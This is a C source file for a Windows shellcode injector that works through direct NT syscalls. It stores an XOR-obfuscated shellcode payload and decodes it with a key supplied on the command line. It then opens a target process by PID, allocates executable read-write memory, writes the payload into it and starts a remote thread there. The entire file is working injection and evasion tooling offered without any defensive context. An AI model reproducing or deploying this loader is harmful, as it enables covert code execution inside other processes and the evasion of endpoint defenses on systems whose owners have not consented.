#include <stdio.h>
#include "syscalls.h"

const char k[4] = "[+]";
const char i[4] = "[*]";
const char e[4] = "[-]";

HANDLE hProcess, hThread;
LPVOID baseAddress = NULL;
NTSTATUS status;

/* place encoded shellcode here */
unsigned char crowPuke[] = "\x8c\x2d\xe2\x97\x80\x8d\xa1\x73\x70\x65\x20\x22\x31\x35\x33\x22\x26\x2d\x50\xa1\x15\x2d\xea\x21\x10\x2d\xea\x21\x68\x2d\xea\x21\x50\x2d\xea\x01\x20\x2d\x6e\xc4\x3a\x2f\x2c\x42\xb9\x2d\x50\xb3\xdc\x59\x00\x0f\x72\x49\x41\x32\xb1\xac\x6c\x32\x71\xa4\x83\x9e\x22\x24\x30\x3b\xfb\x37\x41\xf8\x32\x59\x29\x72\xa0\xee\xe1\xfb\x70\x65\x61\x3b\xf5\xa5\x15\x14\x38\x64\xb1\x23\xfb\x2d\x79\x37\xfb\x25\x41\x3a\x71\xb5\x82\x25\x38\x9a\xa8\x32\xfb\x51\xe9\x3b\x71\xb3\x2c\x42\xb9\x2d\x50\xb3\xdc\x24\xa0\xba\x7d\x24\x60\xb2\x48\x85\x14\x82\x3c\x66\x2d\x57\x78\x20\x58\xa2\x05\xbd\x39\x37\xfb\x25\x45\x3a\x71\xb5\x07\x32\xfb\x69\x29\x37\xfb\x25\x7d\x3a\x71\xb5\x20\xf8\x74\xed\x29\x72\xa0\x24\x39\x32\x28\x3b\x38\x29\x31\x3d\x20\x2a\x31\x3f\x29\xf0\x9c\x45\x20\x21\x8f\x85\x39\x32\x29\x3f\x29\xf8\x62\x8c\x36\x8c\x8f\x9a\x3c\x3b\xca\x64\x61\x73\x70\x65\x61\x73\x70\x2d\xec\xfe\x71\x64\x61\x73\x31\xdf\x50\xf8\x1f\xe2\x9e\xa6\xcb\x85\x7c\x59\x7a\x24\xdb\xd5\xe5\xd8\xfc\x8c\xa5\x2d\xe2\xb7\x58\x59\x67\x0f\x7a\xe5\x9a\x93\x05\x60\xda\x34\x63\x17\x0e\x19\x70\x3c\x20\xfa\xaa\x9a\xb4\x10\x1d\x01\x4f\x16\x08\x00\x41\x5c\x13\x45\x02\x12\x1c\x06\x4f\x16\x08\x00\x61\x73"; // encoded with https://github.com/cr-0w/xorcrypt

SIZE_T crowPukeSize = sizeof(crowPuke);

int main(int argc, char* argv[]) {

	if (argc < 3) {
		printf("%s usage: directsyscalls.exe <PID> <XOR_KEY>, error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	DWORD PID = atoi(argv[1]);
	CLIENT_ID cID = { (HANDLE)PID, NULL };
	OBJECT_ATTRIBUTES objAttrs = { sizeof(objAttrs) };

	char* key = argv[2]; /* make sure this is the same key used in the encryption process */

	printf("%s decoding with key: %s\n", i, key);
	printf("%s decoded %zd-bytes\n\n\r", k, crowPukeSize);

	/* xor-decrypt shellcode */
	size_t keyLength = strlen(key);
	printf("unsigned char crowPuke[] = \"");
	for (int x = 0; x < crowPukeSize - 1; x++) {
		crowPuke[x] = crowPuke[x] ^ key[x % keyLength];
		printf("\\x%02x", crowPuke[x]);
	}
	printf("\";\n\n");

	NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttrs, &cID);

	if (!hProcess || hProcess == NULL) {
		printf("%s could not get a handle to process (%d), error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s NtOpenProcess() ===-----------------> opened a handle to process (%d)\n", k, PID);
	printf("%s NtAllocateVirtualMemory() ===--> allocating %zu-bytes to target process\n", i, crowPukeSize);
	NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &crowPukeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s NtAllocateVirtualMemory() ===---> allocated %zu-bytes to target process\n", k, sizeof(crowPuke)); /* @crowPukeSize -> 4096-bytes */

	printf("%s NtWriteVirtualMemory() ===------------------> writing to process memory\n", i);
	NtWriteVirtualMemory(hProcess, baseAddress, &crowPuke, sizeof(crowPuke), NULL);
	printf("%s NtWriteVirtualMemory() ===--------------------> wrote to process memory\n", k);


	printf("%s NtCreateThreadEx() ===--------------> creating thread in remote process\n", i);
	status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, baseAddress, NULL, FALSE, 0, 0, 0, NULL);
	printf("%s NtCreateThreadEx() ===---------------------------------> thread created\n", k);
	printf("%p\n", hThread);
	printf("0x%lx\n", status);
	if (!hThread || hThread == NULL) {
		printf("%s could not get a handle to thread, error: %ld", e, GetLastError());
		NtClose(hProcess);
		return EXIT_FAILURE;
	}

	WaitForSingleObject(hThread, INFINITE);
	printf("%s WaitForSingleObject() ===-------------------> thread finished execution\n", k);

	printf("%s NtClose() ===------------------------> closing handle to process (%d)\n", i, PID);
	NtClose(hProcess);
	printf("%s NtClose() ===-------------------------> closed handle to process (%d)\n", k, PID);

	printf("%s NtClose() ===--------------------------------> closing handle to thread\n", i);
	NtClose(hThread);
	printf("%s NtClose() ===---------------------------------> closed handle to thread\n", k);

	return EXIT_SUCCESS;

}